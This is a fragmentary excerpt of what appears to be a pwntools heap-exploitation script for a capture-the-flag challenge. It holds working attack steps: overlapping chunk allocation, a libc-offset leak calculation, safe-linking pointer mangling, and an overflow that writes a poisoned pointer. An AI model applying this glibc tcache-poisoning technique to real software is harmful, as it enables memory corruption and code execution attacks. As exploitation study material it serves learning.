...
# get the chunk that overlaps with chunk B 
p.sendline("malloc 11 1272")
...
libc_to_stack_leak = libc_base + 0x21aa20
#print(hex(libc_leak))
...
mangled_ptr = ((chunk_addr >> 12) ^ libc_to_stack_leak)
# Overwrite from chunk D
p.sendline("read_copy 11")
p.sendline(b'A' * 0xd0 + p64(mangled_ptr)) # pwndbg> x/x 0x5571fdbb9300 - 0x5571fdbb92d0 = 0x30 
